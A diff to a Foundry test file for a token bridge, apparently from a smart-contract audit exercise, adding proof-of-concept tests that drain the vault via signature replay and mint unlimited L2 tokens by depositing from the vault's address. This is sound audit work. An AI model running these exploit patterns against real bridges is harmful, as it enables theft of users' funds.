@@ -260,7 +260,7 @@ contract L1BossBridgeTest is Test {
         // 4. After bob calls this function, `Deposit` event will be triggered.
         // with following params (from -> vault, l2Recipient -> bob, amount -> entire balance of `vault` )
         // Note: after an event in emitted, a centralized node will mint the tokens in L2 for `l2Recipient`
-        // 4. `l2Recipient` is bob, all the tokens will be minted for `bob`.
+        // 4. `l2Recipient` is bob, all the tokens will be minted for `bob` in L2
         // 5. from L2 bob can withdraw the tokens.
         // Attacker can do this Infinite times
         // Attacker can mint infinite tokens in L2
@@ -309,6 +309,9 @@ contract L1BossBridgeTest is Test {
         while (token.balanceOf(address(vault)) > 0) {
             tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
         }
+
+        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
     }
 
     function testCanMoveApprovedTokensOfOtherUsers() public {
@@ -346,5 +349,45 @@ contract L1BossBridgeTest is Test {
 
         assertEq(userEndingBalance, 0);
         assertEq(token.balanceOf(address(vault)), userStartingBalance);
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        // 1. Vault will approve the bridge in contructor
+        // 2. Let's say vault has some balance
+        // 3. Bob maliciously call the `depositTokensToL2`
+        // using the params (from -> vault, l2Recipient -> bob, amount -> entire balance of `vault`)
+        // 4. After bob calls this function, `Deposit` event will be triggered.
+        // with following params (from -> vault, l2Recipient -> bob, amount -> entire balance of `vault` )
+        // Note: after an event in emitted, a centralized node will mint the tokens in L2 for `l2Recipient`
+        // 4. `l2Recipient` is bob, all the tokens will be minted for `bob` in L2
+        // 5. from L2 bob can withdraw the tokens.
+        // Attacker can do this Infinite times
+        // Attacker can mint infinite tokens in L2
+
+        //let's assume vault already has some balance
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance);
+        // we are giving 500 ether worth of token to the vault
+
+        address attacker = makeAddr("attacker");
+
+        vm.startPrank(attacker);
+        vm.expectEmit({ emitter: address(tokenBridge) });
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
+
+        // The offchain node will look at the event
+        // event will be
+        // vault has given 500 ether to attacker
+        // therfore 500ether worth of L2 tokens will be given to the attacker in L2
+
+        // attacker can do this forever
+        // minting unlimited tokens in L2
+        vm.startPrank(attacker);
+        vm.expectEmit({ emitter: address(tokenBridge) });
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
     }
 }
